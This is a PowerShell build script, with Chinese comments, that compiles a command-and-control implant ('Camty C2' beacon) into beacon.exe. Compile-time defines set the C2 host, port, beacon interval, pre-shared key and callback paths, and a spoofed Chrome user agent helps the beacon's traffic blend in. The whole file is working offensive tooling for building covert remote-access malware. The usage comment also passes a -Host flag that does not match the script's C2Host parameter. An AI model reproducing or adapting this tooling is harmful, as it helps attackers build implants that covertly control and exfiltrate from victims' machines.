# Camty C2 植入体构建脚本
# 用法示例（PowerShell）：
#   ./build.ps1 -Psk <64位hex>                # 默认 127.0.0.1:8800
#   ./build.ps1 -Psk <64位hex> -Host 10.0.0.5 -Port 443 -Sleep 30
param(
    [Parameter(Mandatory = $true)][string]$Psk,
    [string]$C2Host = "127.0.0.1",
    [int]$Port = 8800,
    [int]$Sleep = 3,
    [string]$Zig = "E:\AI tools\zig\zig-x86_64-windows-0.17.1\zig.exe",
    [string]$Out = "beacon.exe",
    [string]$PathBeacon = "/beacon",
    [string]$PathResult = "/result",
    [string]$Ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    [string]$Ctype = "application/json"
)
if ($Psk -notmatch '^[0-9a-fA-F]{64}$') { Write-Error "Psk 必须是 64 位 hex"; exit 1 }
# raw tokens are stringified in beacon.c (_STR2); UA/CTYPE are compiled-in defaults,
# runtime override via C2_UA / C2_CTYPE / C2_PATH_* env vars
# 注意：数组元素里的字符串拼接必须加括号——PS 的逗号优先级高于 +，
# 不加括号 @('x' + $a, 'y' + $b) 会被折叠成单个字符串（define 全部丢失）
$defs = @(
    ('-DC2_HOST_RAW=' + $C2Host),
    ('-DC2_PORT=' + $Port),
    ("-DC2_SLEEP=$Sleep"),
    ('-DC2_PSK_HEX=' + $Psk),
    ('-DC2_PATH_BEACON_RAW=' + $PathBeacon),
    ('-DC2_PATH_RESULT_RAW=' + $PathResult)
)
# winhttp: HTTP 客户端；bcrypt: BCryptGenRandom（IV/beacon id）；advapi32: SystemFunction036 兜底
& $Zig cc -O2 -Wall -Wextra @defs -o $Out beacon.c crypto.c -lws2_32 -lwinhttp -lbcrypt -ladvapi32
if ($LASTEXITCODE -ne 0) {
    # 构建链不支持 bcrypt.lib 时退 SystemFunction036（RtlGenRandom，advapi32）
    Write-Host "bcrypt 链接失败，回退 CMT1_NO_BCRYPT（SystemFunction036）"
    $defs += '-DCMT1_NO_BCRYPT'
    & $Zig cc -O2 -Wall -Wextra @defs -o $Out beacon.c crypto.c -lws2_32 -lwinhttp -ladvapi32
}
if ($LASTEXITCODE -eq 0) { Write-Host "built $Out -> $C2Host`:$Port" }
